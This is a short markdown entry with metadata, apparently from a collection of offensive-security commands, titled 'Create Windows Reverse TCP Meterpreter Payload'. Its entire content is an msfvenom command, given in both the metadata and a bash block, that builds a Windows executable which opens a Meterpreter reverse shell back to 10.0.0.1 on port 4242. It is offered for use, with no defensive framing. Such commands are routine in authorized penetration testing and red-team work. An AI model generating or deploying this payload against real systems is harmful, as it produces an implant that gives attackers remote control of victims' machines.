---
id: 15295795-3048-4a07-b611-4416e8602e29
name: Create Windows Reverse TCP Meterpreter Payload
type: command
executor: bash
data: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe
  > reverse.exe
output: null
created_at: '2023-04-06T03:56:24.811707+00:00'
updated_at: '2023-04-10T20:25:22.102900+00:00'
---

# Create Windows Reverse TCP Meterpreter Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```
